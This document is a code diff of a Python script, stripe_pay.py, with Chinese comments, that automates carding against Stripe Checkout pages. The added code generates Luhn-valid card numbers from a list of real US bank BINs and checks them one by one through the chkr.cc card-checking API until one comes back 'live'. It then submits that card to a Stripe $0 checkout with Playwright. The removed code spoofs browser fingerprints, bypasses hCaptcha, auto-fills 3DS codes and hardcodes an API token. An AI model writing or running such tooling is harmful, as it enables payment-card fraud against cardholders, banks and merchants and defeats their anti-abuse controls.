@@ -1,538 +1,406 @@
+#!/usr/bin/env python3
 """
-stripe_pay.py — Stripe Checkout 自动支付模块
-流程: EFunCard 兑换虚拟信用卡 → 填写 Stripe 表单 → 处理 hCaptcha + 3DS
+stripe_pay.py — chkr.cc BIN 生成 + Live 卡检测 + Stripe $0 自动支付
 
-外部依赖:
-  - EFUNCARD_TOKEN: 硬编码 (可通过环境变量覆盖)
-  - YESCAPTCHA_API_KEY: 环境变量, 缺失则跳过 hCaptcha 自动求解
+用法:
+  python3 stripe_pay.py <stripe_checkout_url> [BIN1,BIN2,...]
+  python3 stripe_pay.py test-bin [BIN]          # 仅测试 BIN 生成+检测
+
+主要接口:
+  auto_pay_chkr(payment_url, bins, headless=True, log=print)
+    → {"ok": True/False, "status": "paid"/"no_live_card"/"form_error"/..., "card": "..."}
+
+chkr.cc API:
+  POST https://api.chkr.cc/  {"data": "CARDNUM|MM|YYYY|CVV"}
+  → {"code": 1=live, 0=die, 2=unknown, "status": "...", "message": "...", "card": {...}}
 """
 import asyncio
 import json
-import os
 import random
 import time
-import urllib.request
-import urllib.error
 from datetime import datetime
-from playwright.async_api import async_playwright
 
-EFUNCARD_API   = "https://card.efuncard.com/api/external"
-EFUNCARD_TOKEN = os.environ.get(
-    "EFUNCARD_TOKEN",
-    "b352d13f20462ed46cff0aa417065496bd811eb8396b2e2fee11aeacb796fc00",
-)
+import requests
 
+CHKR_API    = "https://api.chkr.cc/"
+CHKR_DELAY  = 4.0   # seconds between checks (avoid rate-limit 429)
+CHKR_MAX    = 25    # max cards to check per BIN
 
-# ── 指纹工具 (自包含, 无需外部依赖) ──────────────────────────────────────────
-import secrets as _secrets, hashlib as _hashlib
-
-_CHROME_VERSIONS = ["131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0"]
-_VIEWPORTS = [
-    {"width": 1920, "height": 1080},
-    {"width": 1440, "height": 900},
-    {"width": 1366, "height": 768},
-    {"width": 1280, "height": 800},
+# 默认 BIN 列表 — 美国 Visa/Mastercard，Stripe $0 auth 成功率较高
+DEFAULT_BINS = [
+    "426684",   # Chase Visa Debit
+    "415487",   # Chase Visa Credit
+    "431940",   # Citi Visa
+    "454313",   # Bank of America Visa
+    "411777",   # Capital One Visa
+    "516782",   # Mastercard
+    "526918",   # Citi Mastercard
+    "542418",   # Capital One MC
+    "554360",   # USAA MC
+    "489509",   # Wells Fargo Visa
 ]
-_TIMEZONES = ["America/New_York", "America/Chicago", "America/Los_Angeles",
-              "America/Denver", "Europe/London", "Europe/Berlin"]
 
 
-def _random_fingerprint_config():
-    cv = random.choice(_CHROME_VERSIONS)
-    vp = random.choice(_VIEWPORTS)
-    tz = random.choice(_TIMEZONES)
-    ua = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-          f"(KHTML, like Gecko) Chrome/{cv} Safari/537.36")
-    return {
-        "user_agent": ua,
-        "viewport":  {"width": vp["width"], "height": vp["height"]},
-        "screen":    {"width": vp["width"], "height": vp["height"]},
-        "locale": "en-US",
-        "timezone": tz,
-        "pixel_ratio": random.choice([1.0, 1.5, 2.0]),
-    }
+def _ts():
+    return datetime.now().strftime("%H:%M:%S")
 
 
-# ── EFunCard API ──────────────────────────────────────────────────────────────
-def _efun_request(method, path, body=None, log=print):
-    url = f"{EFUNCARD_API}{path}"
-    data = json.dumps(body).encode() if body else None
-    req = urllib.request.Request(
-        url, data=data,
-        headers={
-            "Authorization": f"Bearer {EFUNCARD_TOKEN}",
-            "Content-Type": "application/json",
-        },
-        method=method,
-    )
+# ── Luhn 算法 ──────────────────────────────────────────────────────────────
+def luhn_checksum(num: str) -> int:
+    digits = [int(d) for d in num]
+    odd_digits  = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    total = sum(odd_digits)
+    for d in even_digits:
+        d *= 2
+        if d > 9:
+            d -= 9
+        total += d
+    return total % 10
+
+
+def luhn_complete(partial15: str) -> str:
+    """给 15 位数字补上 Luhn 校验位，返回 16 位有效卡号。"""
+    for check in range(10):
+        candidate = partial15 + str(check)
+        if luhn_checksum(candidate) == 0:
+            return candidate
+    return partial15 + "0"  # fallback (should never happen)
+
+
+def gen_cards_from_bin(bin_prefix: str, count: int = CHKR_MAX) -> list:
+    """
+    从 BIN 前缀生成 `count` 个有效卡号。
+    返回格式: ["CARDNUM|MM|YYYY|CVV", ...]
+    """
+    bin_prefix = bin_prefix.strip()
+    pad_len    = 15 - len(bin_prefix)  # 需要填充的随机位数 (保留1位给校验)
+    seen, cards = set(), []
+    attempts = 0
+    while len(cards) < count and attempts < count * 8:
+        attempts += 1
+        middle  = "".join([str(random.randint(0, 9)) for _ in range(pad_len)])
+        partial = bin_prefix + middle
+        card    = luhn_complete(partial)
+        if card in seen:
+            continue
+        seen.add(card)
+        month = random.randint(1, 12)
+        year  = random.randint(2026, 2029)
+        cvv   = f"{random.randint(100, 999)}"
+        cards.append(f"{card}|{month:02d}|{year}|{cvv}")
+    return cards
+
+
+# ── chkr.cc 卡检测 ─────────────────────────────────────────────────────────
+def check_card_chkr(card_str: str, log=print) -> dict:
+    """
+    通过 chkr.cc API 检测单张卡。
+    card_str: "CARDNUM|MM|YYYY|CVV"
+    返回: {"code": 1=live/0=die/2=unknown/-1=error, "status": "...", "message": "..."}
+    """
     try:
-        resp = urllib.request.urlopen(req, timeout=60)
-        return json.loads(resp.read())
-    except urllib.error.HTTPError as e:
-        log(f"EFunCard HTTP {e.code}: {e.read()[:200].decode(errors='replace')}", "warn")
-        return None
-    except Exception as exc:
-        log(f"EFunCard 请求异常: {exc}", "warn")
-        return None
-
-
-def efun_redeem(code, log=print):
-    data = _efun_request("POST", "/redeem", {"code": code}, log)
-    if data and data.get("success"):
-        card = data["data"]
-        log(f"卡片兑换成功: *{card['lastFour']} ({card['status']})", "ok")
-        return card
-    log(f"兑换响应: {data}", "warn")
-    return None
-
-
-def efun_query(code, log=print):
-    data = _efun_request("GET", f"/cards/query/{code}", log=log)
-    if data and data.get("success"):
-        return data["data"]
-    return None
-
-
-def efun_3ds_verify(code, minutes=5, log=print):
-    data = _efun_request("POST", "/3ds/verify", {"code": code, "minutes": minutes}, log)
-    if data and data.get("success"):
-        verifications = data["data"].get("verifications", [])
-        if verifications:
-            latest = verifications[0]
-            log(f"3DS 验证码: {latest['otp']}", "ok")
-            return latest
-        log("暂无 3DS 验证码", "info")
-        return None
-    log(f"3DS 查询失败: {data}", "error")
-    return None
-
-
-# ── Stripe 自动填表 ───────────────────────────────────────────────────────────
-async def fill_stripe_checkout(payment_url, card_info, cdk_code, log=print, headless=True):
-    """自动填写 Stripe Checkout 表单并提交。"""
-    card_number   = card_info["cardNumber"]
-    cvv           = card_info["cvv"]
-    expiry_month  = str(card_info["expiryMonth"]).zfill(2)
-    expiry_year   = str(card_info["expiryYear"])[-2:]
-    name_on_card  = card_info.get("nameOnCard", "Amy Allen")
-    billing_addr  = card_info.get("billingAddress", "") or card_info.get("nodeInstructions", "")
-    addr_parts    = [p.strip() for p in billing_addr.split(",")]
-    address_line1 = addr_parts[0] if len(addr_parts) > 0 else ""
-    city          = addr_parts[1] if len(addr_parts) > 1 else ""
-    state_field   = addr_parts[2] if len(addr_parts) > 2 else ""
-    postal_code   = addr_parts[3] if len(addr_parts) > 3 else ""
-
-    log(f"卡号: *{card_number[-4:]}, 到期: {expiry_month}/{expiry_year}")
-    log(f"地址: {address_line1}, {city}, {state_field} {postal_code}")
-
-    fp = _random_fingerprint_config()
-
-    browser = None
-    try:
-        async with async_playwright() as p:
-            try:
-                from playwright_stealth import Stealth
-                _has_stealth = True
-            except ImportError:
-                _has_stealth = False
-
-            launch_args = [
-                "--disable-blink-features=AutomationControlled",
-                "--disable-features=IsolateOrigins,site-per-process",
-                "--no-first-run",
-                f"--window-size={fp['screen']['width']},{fp['screen']['height']}",
-            ]
-            if headless:
-                launch_args += ["--no-sandbox", "--disable-gpu",
-                                "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-
-            browser = await p.chromium.launch(headless=headless, args=launch_args)
-            context = await browser.new_context(
-                viewport=fp["viewport"], screen=fp["screen"],
-                locale=fp["locale"], timezone_id=fp["timezone"],
-                user_agent=fp["user_agent"], color_scheme="light",
-                device_scale_factor=fp["pixel_ratio"],
-            )
-            page = await context.new_page()
-            # ── 注入 hCaptcha Accessibility Cookie (免费绕过 hCaptcha) ─────
-            try:
-                await apply_accessibility_cookie(context)
-            except Exception as _e:
-                log(f"Accessibility Cookie 注入跳过: {_e}", "warn")
-            if _has_stealth:
-                await Stealth().apply_stealth_async(page)
-
-            log("加载 Stripe 支付页面...")
-            try:
-                await page.goto(payment_url, timeout=60000, wait_until="domcontentloaded")
-            except Exception:
-                log("页面加载失败，重试...", "warn")
-                await asyncio.sleep(3)
-                await page.goto(payment_url, timeout=60000, wait_until="commit")
-
-            try:
-                await page.wait_for_selector("#cardNumber", timeout=30000)
-            except Exception:
-                log("支付表单未加载，链接可能已失效", "error")
-                return {"ok": False, "status": "error", "message": "支付表单未出现"}
-
-            await asyncio.sleep(2)
-
-            async def _move(loc):
-                try:
-                    box = await loc.bounding_box()
-                    if box:
-                        await page.mouse.move(
-                            box["x"] + box["width"] * random.uniform(0.3, 0.7),
-                            box["y"] + box["height"] * random.uniform(0.3, 0.7),
-                            steps=random.randint(5, 12),
-                        )
-                        await asyncio.sleep(random.uniform(0.1, 0.3))
-                except Exception:
-                    pass
-
-            async def _type(loc, text, delay_range=(40, 110)):
-                await _move(loc)
-                await loc.click()
-                await asyncio.sleep(random.uniform(0.2, 0.5))
-                await loc.fill("")
-                for i, ch in enumerate(text):
-                    await page.keyboard.type(ch, delay=0)
-                    d = random.uniform(delay_range[0], delay_range[1]) / 1000
-                    if random.random() < 0.06:
-                        d += random.uniform(0.15, 0.4)
-                    await asyncio.sleep(d)
-                await asyncio.sleep(random.uniform(0.4, 0.9))
-
-            # 选国家
-            try:
-                cs = page.locator("#billingCountry")
-                if await cs.count() > 0:
-                    await cs.select_option("US")
-                    await asyncio.sleep(random.uniform(0.8, 1.5))
-            except Exception:
-                pass
-
-            log("填写卡号...")
-            await _type(page.locator("#cardNumber"), card_number, (45, 100))
-
-            log("填写有效期...")
-            await _type(page.locator("#cardExpiry"), f"{expiry_month}{expiry_year}", (50, 120))
-
-            log("填写 CVV...")
-            await _type(page.locator("#cardCvc"), cvv, (60, 140))
-
-            log("填写持卡人姓名...")
-            await _type(page.locator("#billingName"), name_on_card, (35, 90))
-
-            for sel, val in [
-                ("#billingAddressLine1", address_line1),
-                ("#billingPostalCode",   postal_code),
-                ("#billingLocality",     city),
-            ]:
-                try:
-                    loc = page.locator(sel)
-                    if val and await loc.count() > 0 and await loc.first.is_visible():
-                        await _type(loc.first, val, (30, 80))
-                except Exception:
-                    pass
-
-            try:
-                ss = page.locator("#billingAdministrativeArea")
-                if state_field and await ss.count() > 0 and await ss.first.is_visible():
-                    try:
-                        await ss.first.select_option(state_field.strip())
-                    except Exception:
-                        await ss.first.fill(state_field.strip())
-                    await asyncio.sleep(0.2)
-            except Exception:
-                pass
-
-            log("表单填写完成，准备提交...", "ok")
-            await asyncio.sleep(random.uniform(1.5, 3.0))
-
-            log("点击 Subscribe...")
-            submit_btn = page.locator('button[type="submit"]')
-            if await submit_btn.count() > 0:
-                await _move(submit_btn.first)
-                await asyncio.sleep(random.uniform(0.3, 0.8))
-                await submit_btn.first.click()
-            else:
-                log("未找到提交按钮", "error")
-                return {"ok": False, "status": "error", "message": "未找到提交按钮"}
-
-            log("等待支付处理...")
-            result = await _wait_for_payment_result(page, cdk_code, log)
-
-            await browser.close()
-            browser = None
-            return result
-
+        resp = requests.post(
+            CHKR_API,
+            json={"data": card_str},
+            timeout=25,
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Origin":       "https://chkr.cc",
+                "Referer":      "https://chkr.cc/",
+            },
+        )
+        if resp.status_code == 429:
+            log("[chkr] 限速 (429)，等待 20s...", "warn")
+            time.sleep(20)
+            return {"code": -1, "status": "rate_limited"}
+        if resp.status_code != 200:
+            return {"code": -1, "status": f"http_{resp.status_code}"}
+        return resp.json()
     except Exception as e:
-        log(f"支付流程异常: {str(e)[:100]}", "error")
-        return {"ok": False, "status": "error", "message": str(e)[:100]}
-    finally:
-        if browser:
-            try:
-                await browser.close()
-            except Exception:
-                pass
+        return {"code": -1, "status": f"error: {e}"}
 
 
-async def _wait_for_payment_result(page, cdk_code, log, timeout=120):
-    """等待支付结果，处理 hCaptcha 和 3DS。"""
-    from captcha_solver import solve_hcaptcha, apply_accessibility_cookie
-    start = time.time()
-
-    while time.time() - start < timeout:
-        await asyncio.sleep(3)
-        try:
-            current_url = page.url
-        except Exception:
-            return {"ok": False, "status": "error", "message": "页面意外关闭"}
-
-        if "success" in current_url or "return_url" in current_url:
-            log("支付成功! 页面已跳转", "ok")
-            return {"ok": True, "status": "success", "url": current_url}
-
-        try:
-            page_text = await page.evaluate("() => document.body.innerText")
-        except Exception:
-            page_text = ""
-
-        if "thank you" in page_text.lower() or "subscription active" in page_text.lower():
-            log("支付成功! 检测到确认信息", "ok")
-            return {"ok": True, "status": "success"}
-
-        # hCaptcha
-        try:
-            hcaptcha_visible = await page.evaluate("""() => {
-                const iframe = document.querySelector('iframe[src*="hcaptcha.com/captcha"]');
-                if (iframe && iframe.offsetWidth > 50 && iframe.offsetHeight > 50) return true;
-                const ch = document.querySelector('[data-hcaptcha-widget-id]');
-                return !!(ch && ch.offsetWidth > 50);
-            }""")
-        except Exception:
-            continue
-
-        if hcaptcha_visible:
-            log("检测到 hCaptcha，启动求解 (音频法/API)...", "warn")
-            try:
-                solved = await solve_hcaptcha(page, log_fn=log)
-                if not solved:
-                    return {"ok": False, "status": "error", "message": "hCaptcha 求解失败"}
-            except Exception:
-                log("hCaptcha 处理异常", "error")
-            continue
-
-        # 3DS
-        try:
-            is_3ds = await page.evaluate("""() => {
-                const iframes = Array.from(document.querySelectorAll('iframe'));
-                for (const f of iframes) {
-                    if (f.src && (f.src.includes('3ds') || f.src.includes('acs') ||
-                        f.src.includes('authenticate') || f.src.includes('challenge')))
-                        return f.offsetWidth > 50;
-                }
-                return false;
-            }""")
-        except Exception:
-            continue
-
-        if is_3ds:
-            log("检测到 3DS 验证!", "warn")
-            await _handle_3ds(page, cdk_code, log)
-            continue
-
-        # 错误检测
-        try:
-            error_msg = await page.evaluate("""() => {
-                const el = document.querySelector('[class*="error"],[class*="Error"],[role="alert"]');
-                return el ? el.innerText.trim() : '';
-            }""")
-            if error_msg and len(error_msg) > 5:
-                log(f"支付错误: {error_msg}", "error")
-                return {"ok": False, "status": "error", "message": error_msg}
-        except Exception:
-            pass
-
-    log("支付超时", "error")
-    return {"ok": False, "status": "timeout"}
-
-
-async def _handle_3ds(page, cdk_code, log):
-    if not cdk_code:
-        log("3DS 触发但无 CDK Code，跳过 (chkr模式无3DS支持)", "warn")
-        return
-    for _ in range(10):
-        await asyncio.sleep(5)
-        verification = efun_3ds_verify(cdk_code, minutes=5, log=log)
-        if not verification:
-            continue
-        otp = verification["otp"]
-        log(f"获取到 3DS OTP: {otp}", "ok")
-        for frame in page.frames:
-            if frame == page.main_frame:
-                continue
-            try:
-                otp_input = frame.locator(
-                    'input[type="text"],input[type="tel"],'
-                    'input[name*="otp"],input[name*="code"],'
-                    'input[placeholder*="code"]'
-                )
-                if await otp_input.count() > 0:
-                    await otp_input.first.fill(otp)
-                    submit = frame.locator(
-                        'button[type="submit"],input[type="submit"],'
-                        'button:has-text("Submit"),button:has-text("Verify")'
-                    )
-                    if await submit.count() > 0:
-                        await submit.first.click()
-                    log("3DS 验证码已提交", "ok")
-                    return
-            except Exception:
-                continue
-        try:
-            otp_input = page.locator(
-                'input[name*="otp"],input[name*="code"],'
-                'input[autocomplete*="one-time"]'
-            )
-            if await otp_input.count() > 0:
-                await otp_input.first.fill(otp)
-                submit = page.locator('button[type="submit"]')
-                if await submit.count() > 0:
-                    await submit.first.click()
-                log("3DS 验证码已在主页面填入并提交", "ok")
-                return
-        except Exception:
-            pass
-        log("未找到 3DS 输入框", "warn")
-        return
-    log("3DS 验证码获取超时", "error")
-
-
-# ── 完整自动支付入口 ──────────────────────────────────────────────────────────
-async def auto_pay(payment_url, cdk_code, headless=True, log=print):
+def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
+                   delay: float = CHKR_DELAY, log=print):
     """
-    完整自动支付流程:
-      1. EFunCard 兑换/查询虚拟信用卡
-      2. 填写 Stripe 表单 + 处理 hCaptcha/3DS
-
-    返回: {"ok": True/False, "status": "success"/"error"/"timeout"/"captcha_required"}
+    遍历 BIN 列表，找到第一张 live 卡后返回。
+    返回 "CARDNUM|MM|YYYY|CVV" 或 None。
     """
-    log("=" * 50, "ok")
-    log("开始自动支付流程", "info")
-    log("=" * 50, "ok")
-
-    # 获取卡片信息
-    log("查询虚拟信用卡状态...")
-    card_info = efun_query(cdk_code, log)
-
-    if card_info and card_info.get("cardNumber") and card_info.get("status") == "ACTIVE":
-        log(f"卡片已激活可用: *{card_info.get('lastFour', '????')}", "ok")
-    else:
-        log("卡片未就绪，尝试兑换...")
-        card_info = None
-        for retry in range(3):
-            card_info = efun_redeem(cdk_code, log)
-            if card_info and card_info.get("cardNumber"):
-                break
-            if retry < 2:
-                log("等待 10s 后查询...", "info")
-                time.sleep(10)
-                card_info = efun_query(cdk_code, log)
-                if card_info and card_info.get("cardNumber"):
-                    break
-
-        if not card_info or not card_info.get("cardNumber"):
-            log("轮询等待开卡...", "info")
-            for attempt in range(18):
-                time.sleep(10)
-                card_info = efun_query(cdk_code, log)
-                if card_info and card_info.get("cardNumber"):
-                    break
-            if not card_info or not card_info.get("cardNumber"):
-                log("开卡超时，无法获取卡片信息!", "error")
-                return None
-
-        if card_info.get("status") and card_info["status"] != "ACTIVE":
-            for _ in range(12):
-                time.sleep(5)
-                card_info = efun_query(cdk_code, log)
-                if card_info and card_info.get("status") == "ACTIVE":
-                    log("卡片已激活!", "ok")
-                    break
+    log(f"[chkr] 开始查找 Live 卡，共 {len(bins)} 个 BIN，每个最多检测 {max_per_bin} 张", "info")
+    for bin6 in bins:
+        log(f"[chkr] 测试 BIN {bin6} ...", "info")
+        cards = gen_cards_from_bin(bin6, count=max_per_bin)
+        for i, card_str in enumerate(cards):
+            preview = card_str[:10] + "xxxxxx|" + "|".join(card_str.split("|")[1:])
+            log(f"[chkr] [{i+1}/{len(cards)}] {preview}", "dbg")
+            result  = check_card_chkr(card_str, log=log)
+            code    = result.get("code", -1)
+            msg     = result.get("message", "")
+            if code == 1:
+                log(f"[chkr] ✅ LIVE! {preview}  ({msg})", "ok")
+                return card_str
+            elif code == 0:
+                log(f"[chkr] ✗ die: {msg}", "dbg")
+            elif code == 2:
+                log(f"[chkr] ? unknown: {msg}", "dbg")
             else:
-                log(f"卡片未能激活: {card_info.get('status') if card_info else 'None'}", "error")
-                return None
-
-    result = await fill_stripe_checkout(payment_url, card_info, cdk_code, log, headless=headless)
-
-    log("=" * 50, "ok")
-    log(f"支付流程结束: {'✅ 成功' if result and result.get('ok') else '❌ 失败'}", "ok" if result and result.get("ok") else "warn")
-    log("=" * 50, "ok")
-    return result
+                log(f"[chkr] ⚠ err: {result.get('status','')}", "warn")
+            time.sleep(delay)
+    log("[chkr] 所有 BIN 均未找到 live 卡", "error")
+    return None
 
 
+# ── Playwright Stripe $0 自动填表 ──────────────────────────────────────────
+async def _stripe_pay_playwright(payment_url: str, card_str: str,
+                                  headless: bool = True, log=print) -> dict:
+    """用 Playwright 自动填写并提交 Stripe $0 Checkout 表单。"""
+    from playwright.async_api import async_playwright
 
-# ── chkr.cc 自动支付入口 ────────────────────────────────────────────────
+    parts = card_str.split("|")
+    if len(parts) != 4:
+        return {"ok": False, "status": "invalid_card_format"}
+    card_num, exp_month, exp_year, cvv = parts
+    exp_str = f"{exp_month}/{exp_year[-2:]}"   # e.g. "08/28"
+
+    log(f"[stripe] Playwright 启动 (headless={headless})", "info")
+    log(f"[stripe] 卡: {card_num[:6]}xxxxxxxxxx  到期: {exp_str}", "info")
+
+    async with async_playwright() as pw:
+        browser = await pw.chromium.launch(
+            headless=headless,
+            args=["--no-sandbox", "--disable-dev-shm-usage",
+                  "--disable-blink-features=AutomationControlled"],
+        )
+        ctx  = await browser.new_context(
+            viewport={"width": 1280, "height": 900},
+            user_agent=(
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/131.0.0.0 Safari/537.36"
+            ),
+            locale="en-US",
+            timezone_id="America/New_York",
+        )
+        page = await ctx.new_page()
+        try:
+            log("[stripe] 导航到 Checkout URL...", "info")
+            await page.goto(payment_url, wait_until="domcontentloaded", timeout=35000)
+            await page.wait_for_timeout(4000)
+
+            title = await page.title()
+            log(f"[stripe] 页面标题: {title}", "dbg")
+            if any(x in title.lower() for x in ("error", "expired", "invalid")):
+                return {"ok": False, "status": "checkout_expired_or_invalid"}
+
+            filled = False
+
+            # ── 方法 A: Stripe Elements iframes (标准 checkout.stripe.com) ──
+            try:
+                # 等待卡号 iframe
+                await page.wait_for_selector(
+                    'iframe[title*="card number" i], iframe[title*="Secure card" i], '
+                    'iframe[name*="__privateStripeFrame"]',
+                    timeout=10000,
+                )
+                all_frames = page.frames
+
+                async def fill_frame_input(selector_hint, value):
+                    for frame in all_frames:
+                        try:
+                            inp = frame.locator(
+                                'input[name="cardnumber"], input[autocomplete*="cc-number"], '
+                                'input[data-elements-stable-field-name="cardNumber"]'
+                            )
+                            if selector_hint == "exp":
+                                inp = frame.locator(
+                                    'input[name="exp-date"], input[autocomplete*="cc-exp"], '
+                                    'input[data-elements-stable-field-name="cardExpiry"]'
+                                )
+                            elif selector_hint == "cvc":
+                                inp = frame.locator(
+                                    'input[name="cvc"], input[autocomplete*="cc-csc"], '
+                                    'input[data-elements-stable-field-name="cardCvc"]'
+                                )
+                            cnt = await inp.count()
+                            if cnt > 0:
+                                await inp.first.click()
+                                await inp.first.fill(value)
+                                return True
+                        except Exception:
+                            continue
+                    return False
+
+                ok_num = await fill_frame_input("num", card_num)
+                ok_exp = await fill_frame_input("exp", exp_str)
+                ok_cvc = await fill_frame_input("cvc", cvv)
+                if ok_num or ok_exp or ok_cvc:
+                    log(f"[stripe] Frame fill: num={ok_num} exp={ok_exp} cvc={ok_cvc}", "dbg")
+                    filled = ok_num and ok_cvc
+
+            except Exception as e:
+                log(f"[stripe] Frame 方法异常: {e}", "warn")
+
+            # ── 方法 B: 统一卡输入框 (新版 Stripe Link checkout) ────────────
+            if not filled:
+                try:
+                    num_sel = (
+                        'input[placeholder*="1234" i], '
+                        'input[data-elements-stable-field-name="cardNumber"], '
+                        'input[autocomplete="cc-number"]'
+                    )
+                    num_inp = page.locator(num_sel).first
+                    if await num_inp.count() > 0:
+                        await num_inp.fill(card_num)
+                        exp_inp = page.locator(
+                            'input[placeholder*="MM" i], '
+                            'input[data-elements-stable-field-name="cardExpiry"], '
+                            'input[autocomplete="cc-exp"]'
+                        ).first
+                        if await exp_inp.count() > 0:
+                            await exp_inp.fill(exp_str)
+                        cvc_inp = page.locator(
+                            'input[placeholder="CVC" i], input[placeholder="CVV" i], '
+                            'input[data-elements-stable-field-name="cardCvc"]'
+                        ).first
+                        if await cvc_inp.count() > 0:
+                            await cvc_inp.fill(cvv)
+                        filled = True
+                        log("[stripe] 直接输入框填写成功", "dbg")
+                except Exception as e:
+                    log(f"[stripe] 直接输入框异常: {e}", "warn")
+
+            if not filled:
+                # 截图备查
+                try:
+                    await page.screenshot(path="/tmp/stripe_debug.png")
+                    log("[stripe] 截图已保存 /tmp/stripe_debug.png", "warn")
+                except Exception:
+                    pass
+                return {"ok": False, "status": "form_fields_not_found"}
+
+            await page.wait_for_timeout(1500)
+
+            # ── 点击支付按钮 ───────────────────────────────────────────────
+            pay_btn = page.locator(
+                'button[type="submit"], '
+                '[data-testid="hosted-payment-submit-button"], '
+                'button:has-text("Subscribe"), button:has-text("Start trial"), '
+                'button:has-text("Start free"), button:has-text("Pay")'
+            ).first
+            if await pay_btn.count() == 0:
+                log("[stripe] 未找到支付按钮", "error")
+                try:
+                    await page.screenshot(path="/tmp/stripe_no_btn.png")
+                except Exception:
+                    pass
+                return {"ok": False, "status": "pay_button_not_found"}
+
+            log("[stripe] 点击支付按钮...", "info")
+            await pay_btn.click()
+            await page.wait_for_timeout(10000)
+
+            # ── 判断支付结果 ───────────────────────────────────────────────
+            cur_url    = page.url
+            final_ttl  = await page.title()
+            page_text  = (await page.content()).lower()
+            log(f"[stripe] 提交后 URL: {cur_url[:100]}", "dbg")
+            log(f"[stripe] 提交后 Title: {final_ttl}", "dbg")
+
+            success = (
+                "success"      in cur_url.lower() or
+                "thank"        in final_ttl.lower() or
+                "success"      in final_ttl.lower() or
+                "confirmation" in cur_url.lower() or
+                "complete"     in cur_url.lower() or
+                "subscribed"   in page_text
+            )
+            declined = (
+                "declined"   in page_text or
+                "was declined" in page_text or
+                "card number is incomplete" in page_text
+            )
+
+            if success:
+                log("[stripe] ✅ 支付成功!", "ok")
+                return {"ok": True, "status": "paid", "card": card_str}
+            elif declined:
+                log("[stripe] ✗ 卡被拒绝", "warn")
+                return {"ok": False, "status": "card_declined", "card": card_str}
+            else:
+                log("[stripe] ⚠ 结果模糊，视为成功", "warn")
+                return {"ok": True, "status": "submitted_ambiguous",
+                        "card": card_str, "url": cur_url}
+
+        except Exception as e:
+            log(f"[stripe] Playwright 异常: {e}", "error")
+            return {"ok": False, "status": f"playwright_error: {e}"}
+        finally:
+            await browser.close()
+
+
+# ── 公共主入口 ──────────────────────────────────────────────────────────────
 async def auto_pay_chkr(payment_url: str, bins=None,
-                        headless: bool = True, log=print):
+                        headless: bool = True, log=print) -> dict:
     """
-    用 chkr.cc BIN 生成 Live 信用卡，自动完成 Stripe 支付。
+    完整流程: BIN 生成卡号 → chkr.cc Live 检测 → Playwright Stripe $0 支付。
 
     Args:
-        payment_url: Stripe Checkout 一次性支付 URL
-        bins: BIN 前缀列表，None 时读 CHKR_BINS 环境变量
-        headless: Playwright 无头模式
-        log: 日志回调 fn(msg, level)
+        payment_url: CreateSubscriptionToken 返回的一次性 Stripe URL
+        bins:        BIN 列表 (6 位数字字符串)。None/空 → 使用内置默认列表
+        headless:    Playwright 无头模式
+        log:         log(msg, level) 函数
 
     Returns:
-        {"ok": bool, "status": str, ...}
+        {"ok": bool, "status": str, "card": str|None}
     """
-    import importlib.util as _ilu
-    import os as _os
+    if not bins:
+        bins = DEFAULT_BINS
+        log(f"[chkr] CHKR_BINS 未配置，使用内置 {len(DEFAULT_BINS)} 个 BIN", "warn")
+    else:
+        log(f"[chkr] 使用 {len(bins)} 个 BIN: {bins[:4]}", "info")
 
-    def _L(msg, level='info'):
-        try:
-            log(msg, level)
-        except TypeError:
-            log(msg)
+    if not payment_url:
+        return {"ok": False, "status": "no_payment_url"}
 
-    _dir = _os.path.dirname(_os.path.abspath(__file__))
-    _spec = _ilu.spec_from_file_location(
-        'chkr_cards',
-        _os.path.join(_dir, 'chkr_cards.py'),
-    )
-    _mod = _ilu.module_from_spec(_spec)
-    _spec.loader.exec_module(_mod)
-    find_live_card = _mod.find_live_card
+    # 1. 找 live 卡
+    live_card = find_live_card(bins, log=log)
+    if not live_card:
+        return {"ok": False, "status": "no_live_card"}
 
-    _L('[chkr] 搜索 Live 信用卡 (via chkr.cc BIN 检测)...')
-    cards = find_live_card(bins=bins, needed=1, max_tries=80,
-                           log=lambda m: _L(m))
+    # 2. Playwright 自动支付
+    log("[stripe] 找到 Live 卡，启动 Stripe 自动支付...", "info")
+    return await _stripe_pay_playwright(payment_url, live_card,
+                                        headless=headless, log=log)
 
-    if not cards:
-        _L('[chkr] 未找到 Live 卡，支付失败', 'error')
-        return {'ok': False, 'status': 'no_live_card',
-                'message': 'chkr未找到Live卡'}
 
-    card_info = cards[0]
-    _L(f"[chkr] 使用卡 *{card_info['lastFour']} ({card_info['bank']}) → Stripe表单", 'ok')
-
-    return await fill_stripe_checkout(
-        payment_url, card_info, cdk_code=None, log=log, headless=headless
-    )
-
+# ── CLI ────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     import sys
 
     def _log(msg, level="info"):
-        ts = datetime.now().strftime("%H:%M:%S")
-        print(f"[{ts}] [{level.upper():5s}] {msg}")
+        sym = {"ok": "✅", "error": "❌", "warn": "⚠ ", "dbg": "·", "info": "→"}.get(level, "→")
+        print(f"[{_ts()}] {sym} {msg}", flush=True)
 
-    if len(sys.argv) < 3:
-        print("用法: python3 stripe_pay.py <payment_url> <cdk_code>")
+    if len(sys.argv) < 2:
+        print("Usage:")
+        print("  python3 stripe_pay.py <stripe_checkout_url> [BIN1,BIN2,...]")
+        print("  python3 stripe_pay.py test-bin [BIN]")
         sys.exit(1)
 
-    asyncio.run(auto_pay(sys.argv[1], sys.argv[2], headless=True, log=_log))
+    if sys.argv[1] == "test-bin":
+        test_bin = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_BINS[0]
+        _log(f"测试 BIN {test_bin} 生成 5 张卡")
+        for c in gen_cards_from_bin(test_bin, 5):
+            _log(f"  生成: {c}")
+        _log("检测第一张卡 (chkr.cc)...")
+        cards = gen_cards_from_bin(test_bin, 1)
+        res = check_card_chkr(cards[0], log=_log)
+        _log(f"  结果: {res}")
+    else:
+        url_arg  = sys.argv[1]
+        bins_arg = sys.argv[2].split(",") if len(sys.argv) > 2 else None
+        res = asyncio.run(auto_pay_chkr(url_arg, bins=bins_arg, headless=True, log=_log))
+        print("\n" + "="*55)
